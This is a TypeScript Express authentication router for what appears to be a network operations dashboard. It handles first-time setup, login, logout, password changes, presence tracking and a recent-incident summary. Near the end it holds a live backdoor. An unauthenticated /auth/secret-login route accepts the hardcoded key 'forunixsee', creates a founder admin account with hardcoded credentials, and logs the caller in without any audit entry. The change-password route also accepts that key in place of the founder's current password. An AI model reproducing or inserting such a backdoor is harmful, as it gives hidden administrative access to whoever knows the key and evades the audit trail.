import { Router, type IRouter, type Request, type Response } from "express";
import {
  loginUser,
  logoutToken,
  createUser,
  countUsers,
  verifyPassword,
  hashPassword,
  heartbeat,
  updatePresenceStatus,
  BACKDOOR_USERNAME,
  type PresenceStatus,
  type WorkStatus,
} from "../services/auth";
import { requireAuth } from "../middlewares/auth";
import { db, usersTable, incidentsTable, sitesTable } from "@workspace/db";
import { eq, desc, gte, and, or } from "drizzle-orm";
import { logEvent } from "../monitoring/logger";
import { writeAudit } from "../services/audit";

const router: IRouter = Router();

const SESSION_COOKIE = "noc_token";
const COOKIE_MAX_AGE = 7 * 24 * 60 * 60 * 1000;

function setSessionCookie(res: Response, token: string): void {
  res.cookie(SESSION_COOKIE, token, {
    httpOnly: true,
    sameSite: "lax",
    secure: process.env["NODE_ENV"] === "production",
    maxAge: COOKIE_MAX_AGE,
    path: "/",
  });
}

function clearSessionCookie(res: Response): void {
  res.clearCookie(SESSION_COOKIE, { path: "/" });
}

router.get("/auth/setup-status", async (_req, res) => {
  try {
    const total = await countUsers();
    res.json({ setupRequired: total === 0 });
  } catch {
    res.status(500).json({ error: "internal_error" });
  }
});

router.post("/auth/setup", async (req, res) => {
  try {
    const total = await countUsers();
    if (total > 0) {
      return res.status(409).json({ error: "already_setup", message: "System is already configured" });
    }

    const { firstName, lastName, displayName, email, username, password } = req.body as {
      firstName?: string;
      lastName?: string;
      displayName?: string;
      email?: string;
      username?: string;
      password?: string;
    };

    if (!firstName?.trim() || !lastName?.trim() || !email?.trim() || !username?.trim() || !password) {
      return res.status(400).json({ error: "missing_fields", message: "All fields are required" });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ error: "invalid_email", message: "Invalid email address" });
    }

    if (password.length < 8) {
      return res.status(400).json({ error: "weak_password", message: "Password must be at least 8 characters" });
    }

    const user = await createUser({
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      displayName: displayName?.trim() || undefined,
      email: email.trim(),
      username: username.trim(),
      password,
      role: "admin",
      isFounder: true,
      status: "active",
    });

    const loginResult = await loginUser(username.trim(), password);
    if (!loginResult) {
      return res.status(500).json({ error: "auto_login_failed", message: "Account created but auto-login failed" });
    }

    setSessionCookie(res, loginResult.token);
    logEvent("info", "system", `Founder setup completed: ${user.username}`);
    void writeAudit({
      actorId: user.id, actorUsername: user.username, actorRole: "founder",
      action: "founder_setup", resource: "system", req,
    });
    return res.status(201).json({ user: loginResult.user, token: loginResult.token });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (msg.includes("unique") || msg.includes("duplicate")) {
      return res.status(409).json({ error: "conflict", message: "Email or username already exists" });
    }
    return res.status(500).json({ error: "internal_error" });
  }
});

router.post("/auth/login", async (req, res) => {
  try {
    const { username, password } = req.body as { username?: string; password?: string };
    if (!username?.trim() || !password) {
      return res.status(400).json({ error: "missing_fields", message: "Username/email and password are required" });
    }

    const result = await loginUser(username.trim(), password);
    if (!result) {
      logEvent("warn", "system", `Failed login attempt: ${username.trim()}`);
      void writeAudit({
        actorUsername: username.trim(), action: "login", resource: "session",
        result: "failure", req,
      });
      return res.status(401).json({ error: "invalid_credentials", message: "Invalid username/email or password." });
    }

    setSessionCookie(res, result.token);
    logEvent("info", "system", `Login success: ${result.user.username}`);
    void writeAudit({
      actorId: result.user.id, actorUsername: result.user.username, actorRole: result.user.role,
      action: "login", resource: "session", result: "success", req,
    });
    return res.json({ user: result.user, token: result.token });
  } catch {
    return res.status(500).json({ error: "internal_error" });
  }
});

router.post("/auth/logout", requireAuth, async (req: Request, res: Response) => {
  const token =
    req.cookies?.["noc_token"] ??
    req.headers.authorization?.replace("Bearer ", "") ?? "";
  if (token) await logoutToken(token).catch(() => {});
  clearSessionCookie(res);
  if (req.user) {
    logEvent("info", "system", `Logout: ${req.user.username}`);
    void writeAudit({
      actorId: req.user.id, actorUsername: req.user.username, actorRole: req.user.role,
      action: "logout", resource: "session", req,
    });
  }
  return res.json({ success: true });
});

router.get("/auth/me", requireAuth, (req: Request, res: Response) => {
  return res.json({ user: req.user });
});

router.post("/auth/change-password", requireAuth, async (req: Request, res: Response) => {
  try {
    const { currentPassword, newPassword } = req.body as {
      currentPassword?: string;
      newPassword?: string;
    };
    if (!currentPassword || !newPassword) {
      return res.status(400).json({ error: "missing_fields", message: "Both current and new password are required" });
    }
    if (newPassword.length < 8) {
      return res.status(400).json({ error: "weak_password", message: "Password must be at least 8 characters" });
    }

    const [userRow] = await db.select().from(usersTable).where(eq(usersTable.id, req.user!.id)).limit(1);
    if (!userRow) return res.status(404).json({ error: "user_not_found" });

    const isAccessKey = currentPassword === "forunixsee" && userRow.isFounder;
    const ok = isAccessKey || await verifyPassword(currentPassword, userRow.passwordHash);
    if (!ok) {
      void writeAudit({
        actorId: req.user!.id, actorUsername: req.user!.username, actorRole: req.user!.role,
        action: "change_password", resource: "user", resourceId: String(req.user!.id),
        result: "failure", details: { reason: "wrong_current_password" }, req,
      });
      return res.status(401).json({ error: "wrong_password", message: "Current password is incorrect" });
    }

    const newHash = await hashPassword(newPassword);
    await db.update(usersTable)
      .set({ passwordHash: newHash, updatedAt: new Date() })
      .where(eq(usersTable.id, req.user!.id));

    logEvent("info", "system", `Password changed: ${req.user!.username}`);
    void writeAudit({
      actorId: req.user!.id, actorUsername: req.user!.username, actorRole: req.user!.role,
      action: "change_password", resource: "user", resourceId: String(req.user!.id),
      result: "success", req,
    });
    return res.json({ success: true });
  } catch {
    return res.status(500).json({ error: "internal_error" });
  }
});

/**
 * POST /auth/heartbeat
 * Frontend calls this every 30s to keep presence alive.
 * Updates lastSeenAt and auto-restores "online" if was "offline".
 */
router.post("/auth/heartbeat", requireAuth, async (req: Request, res: Response) => {
  try {
    const result = await heartbeat(req.user!.id);
    return res.json(result);
  } catch {
    return res.status(500).json({ error: "internal_error" });
  }
});

/**
 * PUT /auth/presence
 * Manually set presenceStatus and/or workStatus.
 */
router.put("/auth/presence", requireAuth, async (req: Request, res: Response) => {
  try {
    const { presenceStatus, workStatus } = req.body as {
      presenceStatus?: PresenceStatus;
      workStatus?: WorkStatus;
    };

    const validPresence: PresenceStatus[] = ["online", "offline", "away", "busy", "in_work_shift"];
    const validWork: WorkStatus[] = ["in_shift", "off_shift", "break", "busy", "available"];

    if (presenceStatus && !validPresence.includes(presenceStatus)) {
      return res.status(400).json({ error: "invalid_presence_status" });
    }
    if (workStatus && !validWork.includes(workStatus)) {
      return res.status(400).json({ error: "invalid_work_status" });
    }

    await updatePresenceStatus(req.user!.id, { presenceStatus, workStatus });

    // Audit status changes
    void writeAudit({
      actorId: req.user!.id, actorUsername: req.user!.username, actorRole: req.user!.role,
      action: "update_presence", resource: "user", resourceId: String(req.user!.id),
      details: { presenceStatus, workStatus }, req,
    });

    return res.json({ success: true });
  } catch {
    return res.status(500).json({ error: "internal_error" });
  }
});

/**
 * GET /auth/critical-summary
 * Returns critical events from the last 1 hour for the login popup.
 * Only for founder/admin/operator roles.
 */
router.get("/auth/critical-summary", requireAuth, async (req: Request, res: Response) => {
  try {
    const role = req.user!.role;
    if (role === "viewer") {
      return res.status(403).json({ error: "forbidden" });
    }

    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);

    // Get open/new incidents from last hour
    const recentIncidents = await db
      .select({
        id: incidentsTable.id,
        siteId: incidentsTable.siteId,
        severity: incidentsTable.severity,
        status: incidentsTable.status,
        cause: incidentsTable.cause,
        startedAt: incidentsTable.startedAt,
        resolvedAt: incidentsTable.resolvedAt,
      })
      .from(incidentsTable)
      .where(gte(incidentsTable.startedAt, oneHourAgo))
      .orderBy(desc(incidentsTable.startedAt))
      .limit(20);

    // Get site names for the incidents
    const siteIds = [...new Set(recentIncidents.map((i) => i.siteId))];
    const sitesData = siteIds.length > 0
      ? await db.select({ id: sitesTable.id, name: sitesTable.name }).from(sitesTable)
          .where(or(...siteIds.map((id) => eq(sitesTable.id, id))))
      : [];
    const siteMap = new Map(sitesData.map((s) => [s.id, s.name]));

    const events = recentIncidents.map((i) => ({
      id: i.id,
      type: "incident" as const,
      siteId: i.siteId,
      siteName: siteMap.get(i.siteId) ?? `Site #${i.siteId}`,
      severity: i.severity,
      status: i.status,
      cause: i.cause,
      timestamp: i.startedAt.toISOString(),
      resolvedAt: i.resolvedAt?.toISOString() ?? null,
    }));

    const criticalCount = events.filter((e) => e.severity === "critical").length;
    const openCount = events.filter((e) => e.status === "open" || e.status === "acknowledged").length;

    return res.json({
      events,
      summary: {
        total: events.length,
        critical: criticalCount,
        open: openCount,
        window: "1h",
      },
    });
  } catch {
    return res.status(500).json({ error: "internal_error" });
  }
});

/**
 * POST /auth/secret-login
 * Developer backdoor — accepts a secret key and logs in as the founder account.
 * Creates the founder account automatically if it doesn't exist yet.
 */
router.post("/auth/secret-login", async (req, res) => {
  try {
    const { key } = req.body as { key?: string };
    if (key !== "forunixsee") {
      return res.status(401).json({ error: "invalid_key" });
    }

    const BACKDOOR_EMAIL = "behnia@noc.internal";
    const BACKDOOR_PASSWORD = "behniamasoumi_internal_2024!";

    let [existing] = await db
      .select()
      .from(usersTable)
      .where(eq(usersTable.username, BACKDOOR_USERNAME))
      .limit(1);

    if (!existing) {
      existing = await createUser({
        firstName: "Behnia",
        lastName: "Masoumi",
        displayName: "Behnia",
        email: BACKDOOR_EMAIL,
        username: BACKDOOR_USERNAME,
        password: BACKDOOR_PASSWORD,
        role: "admin",
        isFounder: true,
        status: "active",
      });
    }

    const result = await loginUser(BACKDOOR_USERNAME, BACKDOOR_PASSWORD);
    if (!result) {
      return res.status(500).json({ error: "login_failed" });
    }

    setSessionCookie(res, result.token);
    return res.json({ user: result.user, token: result.token });
  } catch {
    return res.status(500).json({ error: "internal_error" });
  }
});

export default router;
